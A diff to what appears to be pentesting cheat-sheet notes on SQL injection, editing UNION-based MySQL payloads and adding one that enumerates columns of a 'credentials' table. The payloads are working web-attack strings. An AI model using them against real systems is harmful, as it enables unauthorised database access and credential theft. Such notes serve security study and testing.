@@ -23,11 +23,15 @@ Determine the column number
 
 Enumerate Mysql Databases
 ```
-' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
 ```
 Enumerate all tables from database-dev
 ```
-' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+```
+Enumerate column names from table
+```
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
 ```
 ### Blind Sql Injection
 ###### Time-Based
